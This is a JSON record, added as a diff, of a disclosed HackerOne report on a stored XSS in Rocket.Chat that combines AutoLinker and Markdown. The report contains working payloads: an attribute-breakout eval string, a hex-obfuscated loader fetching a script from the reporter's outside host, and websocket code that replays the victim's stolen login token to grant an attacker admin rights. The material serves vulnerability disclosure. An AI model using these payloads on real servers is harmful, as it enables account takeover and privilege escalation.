@@ -1,0 +1,164 @@
+{
+  "id": 735638,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83MzU2Mzg=",
+  "url": "https://hackerone.com/reports/735638",
+  "title": "Account takeover via XSS",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2019-11-11T20:25:38.352Z",
+  "submitted_at": "2019-11-11T20:25:38.352Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "sectex",
+    "url": "/sectex",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/qttgqsg03h4w994ig4zjfdqjj7io/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 19858,
+    "url": "https://hackerone.com/rocket_chat",
+    "handle": "rocket_chat",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/019/858/ada6c92a338715afad123af214dd6e22fd8dc6ff_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/019/858/ada6c92a338715afad123af214dd6e22fd8dc6ff_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Rocket.Chat",
+      "twitter_handle": "RocketChat",
+      "website": "https://rocket.chat",
+      "about": "Rocket.Chat is a company built on open source values and a love for efficiency. The company is driven by our amazing community of contributors."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2021-03-31T08:30:49.240Z",
+  "bug_reporter_agreed_on_going_public_at": "2021-03-01T08:30:23.477Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "**Summary:** By combining AutoLinker and Markdown an attacker is able to inject malicious scripts.\n\n**Description:** By combining AutoLinker and Markdown we can trick the parser into breaking out of the current HTML attribute. \n```\nhttps://a?p=[ ](https:// style=animation-duration:1s;animation-name:blink;animation-iteration-count:2 onanimationiteration=Array.prototype[Symbol.hasInstance]=eval,'alert\\x28\\x27XSS\\x27\\x29;'instanceof[] target=_blank data-x=`.`)\n```\nresults in:\n```html\n<a href=\"https://a?p=<a href=\" https:=\"\" style=\"animation-duration:1s;animation-name:blink;animation-iteration-count:2\" onanimationiteration=\"Array.prototype[Symbol.hasInstance]=eval,'alert\\x28\\x27XSS\\x27\\x29;'instanceof[]\" target=\"_blank\" data-x=\"<span\" class=\"copyonly\">`<span><code class=\"code-colors inline\">.</code></span><span class=\"copyonly\">`</span>\" target=\"_blank\" rel=\"noopener noreferrer\"&gt; </a>\n\" target=\"_blank\" rel=\"noopener noreferrer\"&gt;https://a?p==!=7vrXTtDtYHrLJ4Z7y=!=\"\n```\n\nTo obtain the login-token of the victim we can either use `document.cookie` or `localStorage.getItem('Meteor.loginToken')`.\nSince we can authenticate against the websocket using this token, we can perform any actions in the context of the victim (change password, email etc.).\n\n## Releases Affected:\n\n  * Rocket.Chat-Desktop-Client: v2.16.2\n  * Rocket.Chat-Server: v2.0.0\n  * Apps-Engine-Version: v1.5.2\n\n## Steps To Reproduce (from initial installation to vulnerability):\n\nIn this example, the role `admin` is assigned to the desired user as far as the victim has the required permissions.\n\nCode (replace `{ATTACKER_USERID}` and `{ATTACKER_EMAIL}`):\n```javascript\n    let ws = new WebSocket(`wss://${window.location.host}/sockjs/111/evilwss/websocket`);\n    ws.onmessage = function (evt) {\n        if (/\\[\"{\\\\\"msg\\\\\":\\\\\"pong\\\\\"}\"\\]/.test(event.data)) {\n            ws.send('[\"{\\\\\"msg\\\\\":\\\\\"pong\\\\\"}\"]');\n        }\n        if (/a\\[\"{\\\\\"server_id\\\\\":\\\\\"(.*)\\\\\"}\"\\]/.test(event.data)) {\n            ws.send('[\"{\\\\\"msg\\\\\":\\\\\"connect\\\\\",\\\\\"version\\\\\":\\\\\"1\\\\\",\\\\\"support\\\\\":[\\\\\"1\\\\\",\\\\\"pre2\\\\\",\\\\\"pre1\\\\\"]}\"]');\n            ws.send(`[\"{\\\\\"msg\\\\\":\\\\\"method\\\\\",\\\\\"method\\\\\":\\\\\"login\\\\\",\\\\\"params\\\\\":[{\\\\\"resume\\\\\":\\\\\"${localStorage.getItem('Meteor.loginToken')}\\\\\"}],\\\\\"id\\\\\":\\\\\"1\\\\\"}\"]`);\n        }\n        if (/a\\[\"{\\\\\"msg\\\\\":\\\\\"connected\\\\\",\\\\\"session\\\\\":\\\\\"(.*)\\\\\"}\"\\]/.test(event.data)) {\n            ws.send('[\"{\\\\\"msg\\\\\":\\\\\"method\\\\\",\\\\\"method\\\\\":\\\\\"insertOrUpdateUser\\\\\",\\\\\"params\\\\\":[{\\\\\"_id\\\\\":\\\\\"{ATTACKER_USERID}\\\\\",\\\\\"statusText\\\\\":\\\\\"\\\\\",\\\\\"email\\\\\":\\\\\"{ATTACKER_EMAIL}\\\\\",\\\\\"verified\\\\\":false,\\\\\"password\\\\\":\\\\\"\\\\\",\\\\\"requirePasswordChange\\\\\":false,\\\\\"joinDefaultChannels\\\\\":false,\\\\\"sendWelcomeEmail\\\\\":false,\\\\\"roles\\\\\":[\\\\\"user\\\\\",\\\\\"admin\\\\\"]}],\\\\\"id\\\\\":\\\\\"17\\\\\"}\"]');\n        }\n    };\n```\nPayload (replace `sectex.dev\\x2ffiles\\x2fcswsh.js`):\n```\nhttps://a?p=[ ](https:// style=animation-duration:1s;animation-name:blink;animation-iteration-count:2 onanimationiteration=Array.prototype[Symbol.hasInstance]=eval,'s=document.createElement\\x28\\x27script\\x27\\x29;s.src=\\x27\\x68\\x74\\x74\\x70\\x73\\x3a\\x2f\\x2fsectex.dev\\x2ffiles\\x2fcswsh.js\\x27;document.body.appendChild\\x28s\\x29;'instanceof[] target=_blank data-x=`.`)\n```\n\n## Supporting Material/References:\n\n  * {F631806}\n\n## Suggested mitigation\n\n  * Fix initial XSS\n\n## Impact\n\n* Attackers can execute scripts which can lead to:\n    * Account takeover\n    * Abitrary file read in Rocket.Chat-Desktop\n    * RCE in Rocket.Chat-Desktop (#276031)",
+  "weakness": {
+    "id": 62,
+    "name": "Cross-site Scripting (XSS) - Stored"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 631806,
+      "file_name": "rocketchat.mp4",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/KLYbgVfaRHDw93HK4zu42ZZW?response-content-disposition=attachment%3B%20filename%3D%22rocketchat.mp4%22%3B%20filename%2A%3DUTF-8%27%27rocketchat.mp4&response-content-type=video%2Fmp4&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWPEODDBF%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T151506Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB8aCXVzLXdlc3QtMiJHMEUCIQC29PU%2FjrhrTrwuQy3LCYqDX7UOerD9wzLzz4mr1y37%2BAIgUYd%2FG9GVl%2BwK5Rp%2BxodG0dOErIQ8NZcO3D966hxiDMkquwUI6P%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDEsyD6YaEw%2BDun6YYSqPBYhYjKBX2bPG%2FFuZPmK37I0cJbJBCYOAvXftpysm%2BzXReAWxV6%2FUEbHl1un6%2B%2Bc6%2Fz44dS5%2B57KTilNptTJDUPZZQ8FGJ2AKX5PViJicXrcDMZbAoiFLyH9prJVs%2FwzgnZHX4osrWBFuNA0L7gDeqn9SNQ5Gknukt4vVfR580vRiHCTjBQsFHkXX%2Bs%2BLdf1v1Or7GsRN5H3lgDCnP3HLxEFvmkyB4i3NV0OH9YHSS8t0h2%2BVYGlht0PblS7mXUNl7gZKCaR5Hofafl0RMPHPdoPXTZdqVXV9VEFZJz1G6gQvbBImtHecquEMH%2Fp%2BT%2FCGdxX2U1aEJJCnshObrFAnudfvFrqvpY98eh1ailkKprI1SGbzbGmv%2ByKV3ClxJc5B4vckjM9O%2BC9owspxmNIx76CH4efb1gKtZDPutfIcFJSPgei5AViOYxt5vyGemlkfr9wkSCWqlNo0YEybBy8xdgTFfPIkqyxTmYZYXvQ%2B7NdbJgk8peowaTR7vnDBY5DY4w1XodT3MfYN5vCe45m2Zon7kKtcghPlp87Kk1b1NLWsjfqxLxBEiXc9VFQCcB3CIvYCJZ%2FjLY2Ov%2BFQVnJyPnkIixAJlGcyRtEaoiBqPWo5HFkvJ4%2FWC8YtfDQ%2BVCXqdjFw7KNlaWM4e76l7V5uZRZZIXwMRpUJJAti6e%2FgXP7a9WsS9D4I08H1a1x8h8g7HbjzcJMw0r6gINTJV%2B5NXx73Qxk7RXhqRycxrb473rokw1xPILHgwI36zQn0Ts9sXbwkUwioDWq4ueAOEsCqF0dul8fV4iI6Gbc7do3O%2BAs9bQokeb5KRo74UveVYA8F9w9boCn41xC928jKCUJfiXx1BLMQDWgd4IdDKIaveAcwkI79zwY6sQEbJwA2tB95lkFkWC%2FHXhPskbReU5Ub2jfXdmrffI5v05h%2B4Y7yCH%2BnlPexgdDZsQfvtYmzM0FbTZMHwoeNtm6bCbBQgBrtftx56Ooky6Z%2BIofWcb1M%2FAT5NrmyX99k5BaCJO3yTBLTiQI1EKTjbJQI%2Bc518mAGsJ6A0AZWQWy5oWC5TcNd%2FN4ieUqv10JEIKH%2B3eL5VixEcr9L83YVpmnpiGzV0ulYxlc5rPo%2B1vPLn%2BU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=e01be40159f90ffd753aab4e7a89f63f34a98260fe39cf39d1e9cb37779c5394",
+      "file_size": 1645988,
+      "type": "video/mp4",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2021-03-31T08:30:23.596Z",
+  "allow_singular_disclosure_after": -161160282.42478767,
+  "singular_disclosure_allowed": true,
+  "vote_count": 39,
+  "voters": [
+    "fabianfreyer",
+    "pretorian",
+    "battle_angel",
+    "fqdn",
+    "th4nu_0x0",
+    "nightm4re",
+    "und3sc0n0c1d0",
+    "20kilograma",
+    "xsstestov",
+    "pr0f0x01",
+    "and 29 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "score": 9.0,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "low",
+      "user_interaction": "required",
+      "scope": "changed",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "high"
+    }
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "id": 31732,
+      "category": "team",
+      "content": "An XSS was reported combining AutoLinker and Markdown. By combining AutoLinker and Markdown one could trick the parser into breaking out of the current HTML attribute, resulting in i.a. the possibility to obtain the login-token of a user.\nAn initial attempt to fix the problem did not successfully mitigate the problem, as the reporter was able to continue the exploit with minor adjustments.\nThe reporter suggested various mitigation strategies.\na fix was then released for version 3.11, 3.10.5, 3.9.7, 3.8.8.",
+      "updated_at": "2021-03-18T00:58:35.117Z",
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": [],
+      "user": {
+        "id": 548530,
+        "username": "markus-rocketchat",
+        "name": "markus-rocketchat",
+        "bio": "",
+        "cleared": false,
+        "verified": false,
+        "website": null,
+        "location": "",
+        "created_at": "2019-03-18T21:02:05.125Z",
+        "url": "https://hackerone.com/markus-rocketchat",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "company",
+        "profile_picture_urls": {
+          "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png",
+          "medium": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png",
+          "xtralarge": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+        }
+      }
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
